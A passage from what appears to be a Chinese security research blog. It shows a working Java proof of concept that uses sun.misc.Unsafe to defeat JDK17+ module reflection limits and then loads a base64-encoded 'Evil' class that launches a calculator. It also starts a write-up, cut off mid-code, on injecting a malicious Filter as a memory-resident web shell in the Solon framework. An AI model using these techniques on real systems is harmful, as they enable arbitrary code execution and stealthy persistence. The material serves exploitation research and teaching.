class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Unsafe</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Reflection.registerMethodsToFilter(Unsafe.class, Set.of(<span class="string">&quot;getUnsafe&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Unsafe</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Unsafe</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Unsafe</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> jdk.internal.misc.<span class="type">Unsafe</span> <span class="variable">theInternalUnsafe</span> <span class="operator">=</span> jdk.internal.misc.Unsafe.getUnsafe();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Provides the caller with the capability of performing unsafe</span></span><br><span class="line"><span class="comment">     * operations.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;The returned &#123;<span class="doctag">@code</span> Unsafe&#125; object should be carefully guarded</span></span><br><span class="line"><span class="comment">     * by the caller, since it can be used to read and write data at arbitrary</span></span><br><span class="line"><span class="comment">     * memory addresses.  It must never be passed to untrusted code.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;Most methods in this class are very low-level, and correspond to a</span></span><br><span class="line"><span class="comment">     * small number of hardware instructions (on typical machines).  Compilers</span></span><br><span class="line"><span class="comment">     * are encouraged to optimize these methods accordingly.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;Here is a suggested idiom for using unsafe operations:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;pre&gt; &#123;<span class="doctag">@code</span></span></span><br><span class="line"><span class="comment">     * class MyTrustedClass &#123;</span></span><br><span class="line"><span class="comment">     *   private static final Unsafe unsafe = Unsafe.getUnsafe();</span></span><br><span class="line"><span class="comment">     *   ...</span></span><br><span class="line"><span class="comment">     *   private long myCountAddress = ...;</span></span><br><span class="line"><span class="comment">     *   public int getCount() &#123; return unsafe.getByte(myCountAddress); &#125;</span></span><br><span class="line"><span class="comment">     * &#125;&#125;&lt;/pre&gt;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * (It may assist compilers to make the local variable &#123;<span class="doctag">@code</span> final&#125;.)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span>  SecurityException if the class loader of the caller</span></span><br><span class="line"><span class="comment">     *          class is not in the system domain in which all permissions</span></span><br><span class="line"><span class="comment">     *          are granted.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@CallerSensitive</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> &#123;</span><br><span class="line">        Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class="line">        <span class="keyword">if</span> (!VM.isSystemDomainLoader(caller.getClassLoader()))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Unsafe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> theUnsafe;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">使用Unsafe类时，可以通过两个方法获取其实例。</font></p><ul><li><font style="color:#000000;">从getUnsafe方法的使用限制条件出发，通过Java命令行命令-Xbootclasspath&#x2F;a把调用Unsafe相关方法的类A所在jar包路径追加到默认的bootstrap路径中，使得A被引导类加载器加载，从而通过Unsafe.getUnsafe方法安全的获取Unsafe实例。</font></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 其中path为调用Unsafe相关方法的类所在jar包路径</span></span><br><span class="line">java -Xbootclasspath/a: <span class="variable">$&#123;path&#125;</span></span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">通过反射获取单例对象theUnsafe。</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Unsafe <span class="title function_">reflectGetUnsafe</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class&lt;?&gt; name = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> name.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        log.error(e.getMessage(), e);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">如下图所示，Unsafe提供的API大致可分为内存操作、CAS、Class相关、对象操作、线程调度、系统信息获取、内存屏障、数组操作等几类。</font></p><p><img src="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/1729615985551-292f8d9f-9b1e-49b0-b6f1-87ea5aa0003a.png"></p><p><font style="color:#000000;">在Class相关部分主要提供Class和它的静态字段的操作相关方法，包含静态字段内存定位、定义类、定义匿名类、检验&amp;确保初始化等。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取给定静态字段的内存地址偏移量，这个值对于给定的字段是唯一且固定不变的</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">staticFieldOffset</span><span class="params">(Field f)</span>;</span><br><span class="line"><span class="comment">// 获取一个静态类中给定字段的对象指针</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">staticFieldBase</span><span class="params">(Field f)</span>;</span><br><span class="line"><span class="comment">// 判断是否需要初始化一个类，通常在获取一个类的静态属性的时候（因为一个类如果没初始化，它的静态属性也不会初始化）使用。 当且仅当ensureClassInitialized方法不生效时返回false。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">shouldBeInitialized</span><span class="params">(Class&lt;?&gt; c)</span>;</span><br><span class="line"><span class="comment">// 检测给定的类是否已经初始化。通常在获取一个类的静态属性的时候（因为一个类如果没初始化，它的静态属性也不会初始化）使用。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">ensureClassInitialized</span><span class="params">(Class&lt;?&gt; c)</span>;</span><br><span class="line"><span class="comment">// 定义一个类，此方法会跳过JVM的所有安全检查，默认情况下，ClassLoader（类加载器）和ProtectionDomain（保护域）实例来源于调用者</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len, ClassLoader loader, ProtectionDomain protectionDomain);</span><br><span class="line"><span class="comment">// 定义一个匿名类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineAnonymousClass(Class&lt;?&gt; hostClass, <span class="type">byte</span>[] data, Object[] cpPatches);</span><br></pre></td></tr></table></figure><p>在对象操作部分主要包含对象成员属性相关操作及非常规的对象实例化方式等相关方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回对象成员属性在内存地址相对于此对象的内存地址的偏移量</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">objectFieldOffset</span><span class="params">(Field f)</span>;</span><br><span class="line"><span class="comment">// 获得给定对象的指定地址偏移量的值，与此类似操作还有：getInt，getDouble，getLong，getChar等</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">getObject</span><span class="params">(Object o, <span class="type">long</span> offset)</span>;</span><br><span class="line"><span class="comment">// 给定对象的指定地址偏移量设值，与此类似操作还有：putInt，putDouble，putLong，putChar等</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putObject</span><span class="params">(Object o, <span class="type">long</span> offset, Object x)</span>;</span><br><span class="line"><span class="comment">// 从对象的指定偏移量处获取变量的引用，使用volatile的加载语义</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">getObjectVolatile</span><span class="params">(Object o, <span class="type">long</span> offset)</span>;</span><br><span class="line"><span class="comment">// 存储变量的引用到对象的指定的偏移量处，使用volatile的存储语义</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putObjectVolatile</span><span class="params">(Object o, <span class="type">long</span> offset, Object x)</span>;</span><br><span class="line"><span class="comment">// 有序、延迟版本的putObjectVolatile方法，不保证值的改变被其他线程立即看到。只有在field被volatile修饰符修饰时有效</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putOrderedObject</span><span class="params">(Object o, <span class="type">long</span> offset, Object x)</span>;</span><br><span class="line"><span class="comment">// 绕过构造方法、初始化代码来创建对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">allocateInstance</span><span class="params">(Class&lt;?&gt; cls)</span> <span class="keyword">throws</span> InstantiationException;</span><br></pre></td></tr></table></figure><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p><font style="color:#000000;">在上文提到了</font><strong><font style="color:#000000;">sun.misc和sun.reflect包可供所有JDK版本（包括JDK17）中的工具和库进行反射</font></strong><font style="color:#000000;">，而在sun.misc包下就有着Unsafe类。那么该如何利用Unsafe来打破JDK17及以上的强封装module限制呢？</font></p><p><font style="color:#000000;">在Java中，setAccessible是一个用于改变Java反射时对私有属性或方法访问限制的方法。它是java.lang.reflect.AccessibleObject类的一个方法，该类是Field、Method和Constructor等类的超类。setAccessible(true)方法允许绕过Java的访问控制检查，从而访问私有（private）或受保护（protected）的属性和方法。</font></p><p>跟进<font style="color:#000000;">setAccessible方法，首先调用AccessibleObject类的静态方法checkPermission，该方法检查当前的安全策略是否允许改变访问控制；如果不允许，会抛出SecurityException。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(<span class="type">boolean</span> flag)</span> &#123;</span><br><span class="line">    AccessibleObject.checkPermission();</span><br><span class="line">    <span class="keyword">if</span> (flag) checkCanSetAccessible(Reflection.getCallerClass());</span><br><span class="line">    setAccessible0(flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkPermission</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;removal&quot;)</span></span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// SecurityConstants.ACCESS_PERMISSION is used to check</span></span><br><span class="line">        <span class="comment">// whether a client has sufficient privilege to defeat Java</span></span><br><span class="line">        <span class="comment">// language access control checks.</span></span><br><span class="line">        sm.checkPermission(SecurityConstants.ACCESS_PERMISSION);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">接着，当设置非公共字段或方法的访问权限为true时，会调用checkCanSetAccessible方法，这个方法检查调用setAccessible方法的类是否有权限改变访问控制。Reflection.getCallerClass()方法获取调用setAccessible方法的类，不包括匿名内部类。</font></p><p><font style="color:#000000;">跟进java.lang.reflect.AccessibleObject#checkCanSetAccessible方法，可以看到，callerModule获取调用者的模块，declaringModule获取声明成员（方法或字段）的类的模块，如果调用者的模块与声明成员的类的模块相同，或者调用者是未知模块（Object.class.getModule()通常返回null），则允许访问。</font></p><p><font style="color:#000000;">因此，可以尝试利用Unsafe类来修改当前类的module属性和java.*下类的module属性一致来进行绕过。</font></p><p><img src="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/1729660875570-3cc19ba3-05ee-42d8-adb6-f540b38d6c25.png"></p><p><font style="color:#000000;">在Unsafe类中，存在方法getAndSetObject，该方法是一个用于原子操作的方法，它主要用于在多线程环境下对对象的字段进行安全的更新操作，类似于反射赋值，可以利用其修改调用类的module。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">getAndSetObject</span><span class="params">(Object o, <span class="type">long</span> offset, Object newValue)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> theInternalUnsafe.getAndSetReference(o, offset, newValue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用Unsafe绕过JDK17+反射限制代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Java Version: &quot;</span> + System.getProperty(<span class="string">&quot;java.version&quot;</span>));</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafe.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Module</span> <span class="variable">module</span> <span class="operator">=</span> Object.class.getModule();</span><br><span class="line">        Class&lt;Main&gt; mainClass = Main.class;</span><br><span class="line">        <span class="type">long</span> <span class="variable">offset</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">        unsafe.getAndSetObject(mainClass, offset, <span class="keyword">module</span>);</span><br><span class="line"><span class="comment">//        unsafe.putObject(mainClass, offset, module);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">evilClassBase64</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAAD0AIgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEAEm9wZW4gLWEgQ2FsY3VsYXRvcgoACAAQDAARABIBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7BwAUAQATamF2YS9pby9JT0V4Y2VwdGlvbgcAFgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uCgAVABgMAAUAGQEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgcAGwEABEV2aWwBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQAhABoAAgAAAAAAAgABAAUABgABABwAAAAhAAEAAQAAAAUqtwABsQAAAAEAHQAAAAoAAgAAAAQABAAGAAgAHgAGAAEAHAAAAFQAAwABAAAAF7gABxINtgAPV6cADUu7ABVZKrcAF7+xAAEAAAAJAAwAEwACAB0AAAAWAAUAAAAKAAkADQAMAAsADQAMABYADgAfAAAABwACTAcAEwkAAQAgAAAAAgAh&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(evilClassBase64);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ((Class)method.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Evil&quot;</span>, bytes, <span class="number">0</span>, bytes.length)).newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/1729665004453-6b718c9a-62b0-4676-98cb-74ef4ff36c9c.png"></p><p><img src="/2024/10/23/Unsafe%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/1729664566379-f275d344-d853-43de-a523-b4b60b57412b.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://docs.oracle.com/en/java/javase/17/migrate/migrating-jdk-8-later-jdk-releases.html">Migrating From JDK 8 to Later JDK Releases</a></p><p><a href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html">Java魔法类：Unsafe应用解析</a></p><p><a href="https://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87">JDK17+反射限制绕过</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Trick </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solon框架内存马</title>
      <link href="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><font style="color:#000000;">Solon是一个</font><strong><font style="color:#000000;">高性能的Java应用开发框架</font></strong><font style="color:#000000;">，它具有轻量级、易于使用、高性能和可扩展等特点。</font></p><p><font style="color:#000000;">Solon框架适用于Web、定时任务、远程调用、微服务等多种开发场景，它的设计理念是简单、轻量、易于扩展，并且对开发者友好。Solon的核心模块提供了基础的IOC容器和AOP功能，同时提供了Web模块、数据库模块和其他常用功能模块，以支持更多样化的功能需求。</font></p><p><font style="color:#000000;">Solon架构图如下所示。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729512385439-33bf9cfe-9dd6-4413-981e-c10ffec12fcb.png"></p><p><font style="color:#000000;">Solon框架的请求处理过程涉及几个关键的组件：</font><strong><font style="color:#000000;">过滤器（Filter）</font></strong><font style="color:#000000;">、</font><strong><font style="color:#000000;">路由拦截器（RouterInterceptor）</font></strong><font style="color:#000000;">、</font><strong><font style="color:#000000;">处理器（Handler）</font></strong><font style="color:#000000;">等。以下是Solon处理一个HTTP请求的大致流程：</font></p><ul><li><font style="color:#000000;">启动Solon应用：通过Solon.start(source, args, builder)启动Solon应用，这会实例化Solon.global()并加载配置，扫描插件并排序，运行初始化函数，推送事件，运行插件，导入Java Bean，扫描并加载Java Bean等步骤。</font></li><li><font style="color:#000000;">请求到达：当一个HTTP请求到达Solon应用时，首先会经过过滤器（Filter）。过滤器是全局的，对所有请求都起作用。开发者可以自定义过滤器来实现诸如日志记录、权限检查等功能。</font></li><li><font style="color:#000000;">路由拦截：经过过滤器后，请求会进入路由拦截器（RouterInterceptor）。在这里可以进行路由相关的处理，例如请求的重定向、路由的匹配等。</font></li><li><font style="color:#000000;">处理器处理：路由拦截器之后，请求会交给相应的处理器（Handler）进行处理。在Solon中，处理器可以是注解了@Controller的控制器中的方法，也可以是手动通过app.get、app.post等方法注册的处理器。</font></li><li><font style="color:#000000;">执行控制器方法：如果请求被映射到一个控制器方法，Solon会处理方法上的注解，如@Mapping，并注入参数，然后执行控制器方法。</font></li><li><font style="color:#000000;">返回响应：处理器处理完请求后，会返回一个响应给客户端。这个响应可能是一个字符串、一个模型对象、一个ModelAndView对象等。</font></li><li><font style="color:#000000;">视图渲染：如果处理器返回的是ModelAndView对象，Solon会使用配置的视图引擎（如Freemarker、Thymeleaf等）进行视图渲染，并将最终的HTML发送给客户端。</font></li><li><font style="color:#000000;">异常处理：如果在请求处理过程中发生异常，Solon还提供了异常处理器来统一处理这些异常。</font></li><li><font style="color:#000000;">插件扩展：Solon的插件体系允许开发者在不同的阶段插入自定义的处理逻辑，例如在请求处理前后、Bean加载、插件加载等阶段。</font></li></ul><p><font style="color:#000000;">Solon请求处理过程示意图如下所示，Web处理会经过四个路段：过滤器(Filter) -&gt; 路由拦截器(RouterInterceptor) -&gt; 处理器(Handler) -&gt; 拦截器(Interceptor)。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729512675020-1fc78b9f-eb5b-4b83-9570-914609694f24.png"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>利用官网给出的项目模板搭建即可，<a href="https://solon.noear.org/article/learn-quickstart">https://solon.noear.org/article/learn-quickstart</a>。</p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729565939651-326765b3-bae2-4260-a953-9b8b3e6b1ca3.png"></p><h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p><font style="color:#000000;">编写一个Filter过滤器，在hello路由处下断点进行调试。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component(index = 0)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(Context ctx, FilterChain chain)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(ctx.path());</span><br><span class="line">        chain.doFilter(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">可以看到，最先调用doFilter方法的位置在org.noear.solon.core.ChainManager#doFilter，</font><strong><font style="color:#000000;">此处的作用是构造filterchain</font></strong><font style="color:#000000;">，在filterNodes中存储着需要执行的Filter。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729584625931-ad40b7ef-daa9-4e4b-ae30-f67398f9c823.png"></p><p>继续往上跟进堆栈，在org.noear.solon.SolonApp#tryHandle中调用了<font style="color:#000000;">org.noear.solon.core.ChainManager#doFilter，同时该类继承了</font><font style="color:#080808;background-color:#ffffff;">org.noear.solon.core.route.RouterWrapper。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729584986539-26885c9e-b257-49d3-ab9e-ba5f3c69e7ca.png"></p><p><font style="color:#000000;">跟进</font><font style="color:#000000;background-color:#ffffff;">org.noear.solon.core.route.RouterWrapper，在初始化路由的时候，会对ChainManager进行初始化，通过调用addFilter方法来添加Filter，因此可以</font><strong><font style="color:#000000;background-color:#ffffff;">通过获取上下文中的_chainManager字段，来添加恶意的Filter</font></strong><font style="color:#000000;background-color:#ffffff;">。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729585231716-3a80c65c-b5ea-46a8-9732-5201ad20c7c4.png"></p><p>借助c0ny1师傅的Java内存对象搜索辅助工具java-object-searcher来搜索获取到_chainManager字段的链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 搜索_chainManager</span></span><br><span class="line">List&lt;Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;_chainManager&quot;</span>).build());</span><br><span class="line"><span class="comment">// 新建一个广度优先搜索Thread.currentThread()的搜索器</span></span><br><span class="line"><span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequstByBFS</span>(Thread.currentThread(), keys);</span><br><span class="line"><span class="comment">// 打开调试模式, 会生成log日志</span></span><br><span class="line">searcher.setIs_debug(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 挖掘深度为20</span></span><br><span class="line">searcher.setMax_search_depth(<span class="number">20</span>);</span><br><span class="line"><span class="comment">// 